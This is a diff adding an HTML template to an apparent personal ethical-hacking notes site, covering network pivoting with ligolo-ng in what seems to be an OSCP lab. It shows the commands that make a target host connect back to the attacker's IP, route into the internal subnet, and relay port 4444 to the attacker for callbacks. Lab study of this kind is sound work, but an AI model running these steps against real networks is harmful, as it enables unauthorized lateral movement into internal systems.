@@ -1,0 +1,59 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Prerequisites</h1>
+    <ul><li>Upload agent.exe</li></ul>
+
+    <h2>Setup</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>sudo ip tuntap add user $(whoami) mode tun ligolo</u></code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>sudo ip link set ligolo up</u></code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>ip addr show ligolo</u></code></pre></div>
+
+<h2>Start ligolo-ng</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>ligolo-proxy -selfcert -laddr 0.0.0.0:9001</u></code></pre></div>
+
+
+
+
+
+<h2>On the target mechine</h2>
+<div class="code-box"><pre><code><u>.\agent.exe -connect MY_IP:9001 -ignore-cert</u></code></pre></div>
+
+
+<h2>Select Agent (Agent joined -> Enter "session" -> select session)</h2>
+<div class="code-box"><pre><code>ligolo-ng » INFO[0195] Agent joined.                                 id=005056ab8bf5 name="OSCP\\eric.wallows@MS01" remote="192.168.115.147:59014"
+ligolo-ng » 
+ligolo-ng » <u>session</u>
+? Specify a session : <u>1</u> - OSCP\eric.wallows@MS01 - 192.168.115.147:59014 - 005056ab8bf5
+[Agent : OSCP\eric.wallows@MS01] »  </code></pre></div>
+
+<h2>Start session</h2>
+<div class="code-box"><pre><code>[Agent : OSCP\eric.wallows@MS01] » <u>tunnel_start --tun ligolo</u>
+INFO[0284] Starting tunnel to OSCP\eric.wallows@MS01 (005056ab8bf5) </code></pre></div>
+
+<h2>Add tunnel</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ <u>sudo ip route add XXX.XXX.XXX.0/24 dev ligolo</u> # add TARGET_IP_RANGE
+┌──(kali㉿kali)-[~/utils/Windows]
+└─$ ip route | grep 10.10.75 
+10.10.75.0/24 dev ligolo scope link </code></pre></div>
+
+<h1>Create VIA tunnel</h1>
+<div class="code-box"><pre><code>[Agent : OSCP\eric.wallows@MS01] » <u>listener_add --addr JUNCTION_IP:4444 --to MY_IP:4444 --tcp</u>
+INFO[1301] Listener 0 created on remote agent!</code></pre></div>
+<p class="text">Junction IP should be the subnet IP like 10.10.xxx.xxx (it must have it)</p>
+
+
+</body>
+</html>
